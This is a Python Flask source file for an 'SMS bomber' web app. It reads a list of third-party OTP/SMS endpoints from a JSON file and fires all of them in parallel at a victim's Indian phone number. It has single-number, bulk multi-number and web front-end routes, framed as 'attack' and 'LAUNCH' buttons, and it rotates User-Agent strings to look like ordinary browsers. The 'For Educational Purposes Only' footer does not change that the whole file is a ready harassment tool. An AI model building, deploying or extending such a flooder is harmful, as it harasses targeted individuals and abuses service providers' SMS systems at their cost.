import json
import random
import time
import os
import requests
import concurrent.futures
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# Load APIs from JSON file
def load_apis():
    try:
        with open('apis.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        # Handle both list format and {"apis": [...]} format
        if isinstance(data, dict) and "apis" in data:
            return data["apis"]
        return data
    except FileNotFoundError:
        print("Error: apis.json not found.")
        return []
    except json.JSONDecodeError:
        print("Error: apis.json is not valid JSON.")
        return []

APIS = load_apis()

def recursive_replace(data, phone):
    """
    Recursively replace placeholders in strings, dicts, and lists.
    Handles: {no}, {phone}, {cc} (defaults to 91), {dur} (defaults to 60)
    """
    if isinstance(data, str):
        # Replace placeholders
        data = data.replace("{no}", phone)
        data = data.replace("{phone}", phone)
        data = data.replace("{cc}", "91")  # Defaulting to India Country Code
        data = data.replace("{dur}", "60") # Defaulting duration
        return data
    elif isinstance(data, dict):
        return {k: recursive_replace(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [recursive_replace(i, phone) for i in data]
    return data

def send_single_request(api_config, phone_number):
    """Send request to single API"""
    result = {
        "name": api_config["name"],
        "status": "pending",
        "message": "",
        "response_code": None,
        "time_taken": None
    }
    
    try:
        start_time = time.time()
        
        # 1. Prepare URL (Handle placeholders)
        url = api_config["url"]
        url = recursive_replace(url, phone_number)
        
        # 2. Prepare Headers
        headers = api_config.get("headers", {})
        
        # Add random User-Agent if not present
        if "User-Agent" not in headers and "user-agent" not in headers:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            headers["User-Agent"] = random.choice(user_agents)
        
        # 3. Prepare Body (Handle 'body' key instead of 'data')
        raw_body = api_config.get("body")
        final_body = None
        
        if raw_body is not None:
            # Recursively replace placeholders in the body structure
            final_body = recursive_replace(raw_body, phone_number)

        # 4. Determine Request Method and Payload Type
        method = api_config.get("method", "POST").upper()
        timeout = random.randint(8, 12)
        
        # Check if we should send JSON or Form data
        # We look at the 'Content-Type' header.
        content_type = headers.get("Content-Type", headers.get("content-type", ""))
        
        response = None
        
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=timeout)
        
        elif method == "PUT":
            if isinstance(final_body, dict) and "application/json" in content_type:
                response = requests.put(url, json=final_body, headers=headers, timeout=timeout)
            else:
                response = requests.put(url, data=final_body, headers=headers, timeout=timeout)
                
        else: # Default to POST
            if isinstance(final_body, dict) and "application/json" in content_type:
                response = requests.post(url, json=final_body, headers=headers, timeout=timeout)
            else:
                # If final_body is a dict but content-type isn't json, requests converts it to form data
                response = requests.post(url, data=final_body, headers=headers, timeout=timeout)
        
        end_time = time.time()
        
        # Update result
        result["status"] = "success" if response.status_code in [200, 201, 202] else "failed"
        result["response_code"] = response.status_code
        result["time_taken"] = round(end_time - start_time, 2)
        result["message"] = response.text[:200] if response.text else "No response"
                
    except requests.exceptions.Timeout:
        result["status"] = "timeout"
        result["message"] = "Request timeout"
    except requests.exceptions.ConnectionError:
        result["status"] = "connection_error"
        result["message"] = "Connection failed"
    except requests.exceptions.RequestException as e:
        result["status"] = "error"
        result["message"] = str(e)
    except Exception as e:
        result["status"] = "error"
        result["message"] = f"Unknown error: {str(e)}"
    
    return result

@app.route('/api', methods=['GET'])
def api_endpoint():
    """Main API endpoint - Send SMS requests"""
    phone_number = request.args.get('num')
    
    if not phone_number:
        return jsonify({
            "status": "error",
            "message": "Phone number is required. Use /api?num=XXXXXXXXXX"
        }), 400
    
    # Validate phone number (10 digits)
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({
            "status": "error",
            "message": "Invalid phone number. Please provide 10-digit number"
        }), 400
    
    try:
        start_time = time.time()
        successful = 0
        failed = 0
        
        max_workers = int(request.args.get('workers', 10))
        
        # Send requests in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(send_single_request, api, phone_number) for api in APIS]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result["status"] == "success":
                        successful += 1
                    else:
                        failed += 1
                except Exception:
                    failed += 1
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        
        response_data = {
            "status": "completed",
            "successful": successful,
            "failed": failed,
            "timestamp": datetime.now().isoformat(),
            "total_requests": len(APIS),
            "total_time_seconds": total_time
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Server error: {str(e)}"
        }), 500

@app.route('/api/test', methods=['GET'])
def test_single():
    """Test single API"""
    phone_number = request.args.get('num')
    api_name = request.args.get('api')
    
    if not phone_number or not api_name:
        return jsonify({
            "status": "error",
            "message": "Both 'num' and 'api' parameters are required"
        }), 400
    
    # Find API
    api_config = None
    for api in APIS:
        if api["name"].lower() == api_name.lower():
            api_config = api
            break
    
    if not api_config:
        return jsonify({
            "status": "error",
            "message": f"API '{api_name}' not found"
        }), 404
    
    # Send request
    result = send_single_request(api_config, phone_number)
    
    return jsonify({
        "status": "completed",
        "phone_number": phone_number,
        "api": api_name,
        "result": result
    })

@app.route('/api/bulk', methods=['POST'])
def bulk_requests():
    """Bulk requests with custom configuration"""
    try:
        data = request.json
        
        if not data:
            return jsonify({
                "status": "error",
                "message": "JSON data is required"
            }), 400
        
        phone_numbers = data.get("phone_numbers", [])
        selected_apis = data.get("apis", "all")
        delay = data.get("delay", 2)
        max_workers = data.get("workers", 5)
        
        if not phone_numbers:
            return jsonify({
                "status": "error",
                "message": "phone_numbers array is required"
            }), 400
        
        # Filter APIs
        if selected_apis != "all":
            apis_to_use = [api for api in APIS if api["name"] in selected_apis]
        else:
            apis_to_use = APIS
        
        overall_stats = {
            "total_numbers": len(phone_numbers),
            "total_requests": len(apis_to_use) * len(phone_numbers),
            "completed": 0,
            "successful": 0,
            "failed": 0
        }
        
        for idx, phone in enumerate(phone_numbers):
            if idx > 0:
                time.sleep(delay)
            
            phone_successful = 0
            phone_failed = 0
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(send_single_request, api, phone) for api in apis_to_use]
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                        if result["status"] == "success":
                            phone_successful += 1
                            overall_stats["successful"] += 1
                        else:
                            phone_failed += 1
                            overall_stats["failed"] += 1
                    except Exception:
                        phone_failed += 1
                        overall_stats["failed"] += 1
            
            overall_stats["completed"] += 1
        
        return jsonify({
            "status": "completed",
            "overall_stats": overall_stats,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error processing bulk request: {str(e)}"
        }), 500

@app.route('/api/ping', methods=['GET'])
def ping():
    """Check if API is alive"""
    return jsonify({
        "status": "alive",
        "timestamp": datetime.now().isoformat(),
        "version": "2.0.0",
        "total_apis": len(APIS)
    })

@app.route('/')
def home():
    # Using a simplified HTML block to keep the code clean, 
    # identical logic to the original but updated string replacements
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>SMS BOMBER</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            :root {
                --primary: #0f0f0f;
                --accent: #e50914; /* Netflix red style */
                --text: #ffffff;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: var(--primary);
                color: var(--text);
                display: flex;
                flex-direction: column;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 800px;
                width: 100%;
                text-align: center;
            }
            h1 {
                font-size: 3rem;
                margin-bottom: 10px;
                text-transform: uppercase;
                letter-spacing: 2px;
            }
            .highlight { color: var(--accent); }
            .card {
                background: #1a1a1a;
                border-radius: 10px;
                padding: 30px;
                margin-top: 30px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            }
            input[type="text"] {
                padding: 15px;
                font-size: 1.2rem;
                border-radius: 5px;
                border: 2px solid #333;
                background: #000;
                color: #fff;
                width: 70%;
                margin-right: 10px;
            }
            button {
                padding: 15px 30px;
                font-size: 1.2rem;
                background-color: var(--accent);
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                text-transform: uppercase;
            }
            button:hover { background-color: #b2070f; }
            button:disabled { background-color: #555; cursor: not-allowed; }
            #responseBox {
                margin-top: 20px;
                padding: 15px;
                background: #000;
                border-radius: 5px;
                min-height: 100px;
                text-align: left;
                white-space: pre-wrap;
                font-family: monospace;
                border: 1px solid #333;
            }
            .stats { display: flex; justify-content: space-around; margin-top: 20px; }
            .stat-box { text-align: center; }
            .stat-number { font-size: 2rem; font-weight: bold; color: var(--accent); }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>PRINCE <span class="highlight">BOMBER</span></h1>
            <p>Advanced SMS Flooding System</p>
            
            <div class="card">
                <input type="text" id="phoneNumber" placeholder="10 Digit Number" maxlength="10">
                <button onclick="testAPI()" id="attackBtn">LAUNCH</button>
                
                <div id="responseBox">Ready to attack...</div>
                
                <div class="stats" id="stats" style="display:none;">
                    <div class="stat-box">
                        <div class="stat-number" id="successCount">0</div>
                        <div>Success</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number" id="failCount">0</div>
                        <div>Failed</div>
                    </div>
                </div>
            </div>
            
            <p style="margin-top: 50px; font-size: 0.8rem; color: #666;">
                Loaded APIs: """ + str(len(APIS)) + """ | For Educational Purposes Only
            </p>
        </div>

        <script>
            function testAPI() {
                const phone = document.getElementById('phoneNumber').value.trim();
                const responseBox = document.getElementById('responseBox');
                const btn = document.getElementById('attackBtn');
                const stats = document.getElementById('stats');
                
                if (!phone || phone.length !== 10 || !/^[6-9]\\d{9}$/.test(phone)) {
                    responseBox.innerHTML = '<span style="color: red;">Invalid Indian Number</span>';
                    return;
                }
                
                btn.disabled = true;
                btn.textContent = 'FIRING...';
                responseBox.textContent = 'Initializing attack vectors...';
                stats.style.display = 'none';

                fetch(`/api?num=${phone}&workers=20`)
                    .then(response => response.json())
                    .then(data => {
                        responseBox.innerHTML = '<span style="color: #4CAF50;">Attack Completed!</span>\\nTime: ' + data.total_time_seconds + 's';
                        
                        document.getElementById('successCount').innerText = data.successful;
                        document.getElementById('failCount').innerText = data.failed;
                        stats.style.display = 'flex';
                    })
                    .catch(error => {
                        responseBox.innerHTML = '<span style="color: red;">Error: ' + error.message + '</span>';
                    })
                    .finally(() => {
                        btn.disabled = false;
                        btn.textContent = 'LAUNCH';
                    });
            }

            // Input formatting
            document.getElementById('phoneNumber').addEventListener('input', function (e) {
                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
            });
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Loaded {len(APIS)} APIs")
    print(f"Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
